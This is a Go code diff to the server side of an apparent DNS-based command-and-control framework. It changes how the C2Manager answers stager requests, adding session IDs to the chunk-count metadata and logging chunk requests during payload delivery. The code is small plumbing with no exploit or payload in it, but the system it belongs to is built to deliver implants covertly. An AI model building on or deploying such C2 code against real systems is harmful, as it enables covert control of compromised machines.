@@ -9,6 +9,7 @@ import (
 	"crypto/sha256"
 	"encoding/base64"
 	"fmt"
+	"math/rand"
 	"os"
 	"path/filepath"
 	"strconv"
@@ -1294,8 +1295,13 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 				sessionInfo.SessionID, sessionInfo.TotalChunks)
 		}
 
-		// Return META response with chunk count only (domains compiled into stager)
-		return fmt.Sprintf("META|%d", sessionInfo.TotalChunks)
+		// Return META response with session ID and chunk count
+		// Format: META|<session_id>|<total_chunks>
+		metaResponse := fmt.Sprintf("META|%s|%d", sessionInfo.SessionID, sessionInfo.TotalChunks)
+		if !isDuplicate {
+			logf("[C2] Returning META response: %s (len=%d)", metaResponse, len(metaResponse))
+		}
+		return metaResponse
 	}
 
 	// Standalone mode fallback - use local client binary
@@ -1394,6 +1400,9 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 			stagerIP, stagerOS, stagerArch, len(chunks), chunkSize)
 	}
 
+	// Generate session ID for standalone mode
+	sessionID := fmt.Sprintf("stg_%d_%d", time.Now().Unix(), rand.Intn(10000))
+
 	// Store session for this stager using the stager's actual IP (not DNS resolver IP)
 	// This allows the stager to send ACKs through different DNS resolvers
 	session := &StagerSession{
@@ -1410,8 +1419,13 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 	c2.stagerSessions[stagerIP] = session // Key by stager's actual IP
 	c2.mutex.Unlock()
 
-	// Return metadata
-	return fmt.Sprintf("META|%d", len(chunks))
+	if !isDuplicate {
+		logf("[C2] Stager session created: %s (%d chunks in standalone mode)", sessionID, len(chunks))
+	}
+
+	// Return metadata with session ID and chunk count (matching distributed mode format)
+	// Format: META|<session_id>|<total_chunks>
+	return fmt.Sprintf("META|%s|%d", sessionID, len(chunks))
 }
 
 // handleStagerAck processes a stager acknowledgment for chunk delivery
@@ -1432,6 +1446,10 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 
 	stagerIP := parts[2]  // Extract stager's actual IP from ACK message
 	sessionID := parts[3] // Session ID or hostname
+
+	if !isDuplicate {
+		logf("[C2] CHUNK request: index=%d, stager_ip=%s, session_id=%s", chunkIndex, stagerIP, sessionID)
+	}
 
 	// In distributed mode, request chunk from Master
 	if masterClient != nil {
